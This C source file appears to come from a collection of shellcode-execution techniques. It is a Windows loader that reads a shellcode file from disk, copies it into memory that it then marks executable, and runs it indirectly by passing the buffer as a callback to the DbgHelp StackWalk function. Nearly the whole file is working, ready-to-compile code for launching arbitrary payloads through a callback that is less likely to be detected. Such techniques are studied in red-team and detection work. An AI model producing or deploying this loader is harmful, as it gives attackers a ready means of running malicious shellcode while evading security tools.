// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "DbgHelp.lib")

#include <stdio.h>
#include <Windows.h>
#include <dbghelp.h>

BOOL ReadContents(PSTR Filepath, PCHAR *Buffer, PDWORD BufferSize);

INT main(INT argc, char **argv)
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	PVOID hAlloc = NULL;

	if (argc != 2)
	{
		printf("Usage: StackWalk.exe C:\\Path\\To\\Shellcode.bin\n");
		goto CLEANUP;
	}

	// Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
	{
		printf("Failed to read shellcode file\n");
		goto CLEANUP;
	}

	hAlloc = VirtualAlloc(NULL, SCLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!hAlloc)
	{
		printf("VirtualAlloc failed\n");
		goto CLEANUP;
	}

	memcpy(hAlloc, Shellcode, SCLen);

	DWORD oldProtect;
	if (!VirtualProtect(hAlloc, SCLen, PAGE_EXECUTE, &oldProtect))
	{
		printf("VirtualProtect failed\n");
		goto CLEANUP;
	}

	printf("Executing shellcode...\n");
	// Execute the shellcode
	// ((void(*)())hAlloc)();
	STACKFRAME sStackFrame = {0};
	CONTEXT sContext = {0};

	StackWalk(
		IMAGE_FILE_MACHINE_AMD64,				// MachineType
		(HANDLE)-1,					// hProcess
		NULL,									// hThread
		&sStackFrame,							// A pointer to a STACKFRAME64 structure. This structure receives information for the next frame
		&sContext,								// A pointer to a CONTEXT structure.
		NULL,									// ReadMemoryRoutine
		(PFUNCTION_TABLE_ACCESS_ROUTINE)hAlloc, // FunctionTableAccessRoutine
		NULL,									// GetModuleBaseRoutine
		NULL);									// TranslateAddress

CLEANUP:
	if (hAlloc)
		VirtualFree(hAlloc, 0, MEM_RELEASE);

	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PSTR Filepath, PCHAR *Buffer, PDWORD BufferSize)
{
	FILE *f = fopen(Filepath, "rb");
	if (!f)
	{
		printf("Failed to open file: %s\n", Filepath);
		return FALSE;
	}

	fseek(f, 0, SEEK_END);
	*BufferSize = ftell(f);
	fseek(f, 0, SEEK_SET);

	*Buffer = (PCHAR)malloc(*BufferSize);
	if (!*Buffer)
	{
		printf("Memory allocation failed\n");
		fclose(f);
		return FALSE;
	}

	fread(*Buffer, *BufferSize, 1, f);
	fclose(f);

	return TRUE;
}
